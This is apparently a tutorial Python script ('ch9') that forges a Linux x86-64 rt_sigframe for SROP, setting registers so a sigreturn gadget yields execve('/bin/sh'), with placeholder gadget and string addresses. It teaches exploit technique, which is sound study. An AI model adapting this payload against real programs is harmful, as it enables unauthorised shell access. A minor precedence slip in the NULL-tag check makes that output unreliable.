#!/usr/bin/env python3
"""ch9: forge a Linux x86-64 rt_sigframe by hand. Every field is at
a fixed offset from rsp when the kernel restores from sigreturn — set
them, jump to a syscall gadget, and the kernel gives you your chosen
register state, including a controlled rip. This is SROP."""
import struct

def p64(v): return struct.pack("<Q", v & ((1<<64)-1))

# Layout of the x86-64 sigcontext (partial — key registers only)
# Full struct is in <bits/sigcontext.h>; offsets from &uc.uc_mcontext:
FIELDS = [
    ("r8",     0x00),
    ("r9",     0x08),
    ("r10",    0x10),
    ("r11",    0x18),
    ("r12",    0x20),
    ("r13",    0x28),
    ("r14",    0x30),
    ("r15",    0x38),
    ("rdi",    0x40),
    ("rsi",    0x48),
    ("rbp",    0x50),
    ("rbx",    0x58),
    ("rdx",    0x60),
    ("rax",    0x68),
    ("rcx",    0x70),
    ("rsp",    0x78),
    ("rip",    0x80),
    ("eflags", 0x88),
    ("cs/gs/fs", 0x90),
    ("err",    0x98),
    ("trapno", 0xa0),
    ("oldmask",0xa8),
    ("cr2",    0xb0),
    ("fpstate",0xb8),
]

# Attacker's target: execve("/bin/sh", NULL, NULL) via a raw syscall
SYSCALL_GADGET = 0x000000000040119a
BIN_SH_ADDR    = 0x0000000000404060
SYS_EXECVE     = 59

# Build the mcontext
mc = bytearray(0x200)
def set_reg(name, value):
    off = dict(FIELDS)[name]
    mc[off:off+8] = p64(value)

set_reg("rdi",  BIN_SH_ADDR)      # argv[0] path
set_reg("rsi",  0)                # argv = NULL
set_reg("rdx",  0)                # envp = NULL
set_reg("rax",  SYS_EXECVE)       # syscall number
set_reg("rip",  SYSCALL_GADGET)   # where the kernel resumes us
set_reg("rsp",  0x00007fff0000)   # any valid stack (kernel needs sane rsp)
set_reg("cs/gs/fs", 0x33)          # user code segment on Linux x86-64

# Set eflags to a sane default
set_reg("eflags", 0x246)

print("=== sigreturn-oriented programming: hand-forged rt_sigframe ===")
print(f"gadget for rt_sigreturn: pop rax=15 ; syscall")
print(f"                        (kernel then restores registers from *rsp)")
print()
print(f"forged mcontext (0x{len(mc):x} bytes) — key fields:")
for name, off in FIELDS[:18]:
    val = int.from_bytes(mc[off:off+8], 'little')
    tag = ""
    if name == "rax" and val == SYS_EXECVE: tag = "   <- execve"
    if name == "rip" and val == SYSCALL_GADGET: tag = "   <- syscall gadget"
    if name == "rdi" and val == BIN_SH_ADDR: tag = "   <- /bin/sh"
    if name == "rsi" or name == "rdx" and val == 0: tag = "   <- NULL"
    print(f"  {name:>7s} @ +{off:#04x}  = {val:#018x}{tag}")
print()
print("chain:  pop rax=15 ; syscall  ->  kernel loads all regs from the")
print("        frame above  ->  execute execve('/bin/sh', NULL, NULL)")
print(f"total frame bytes to plant on stack: {len(mc)}")
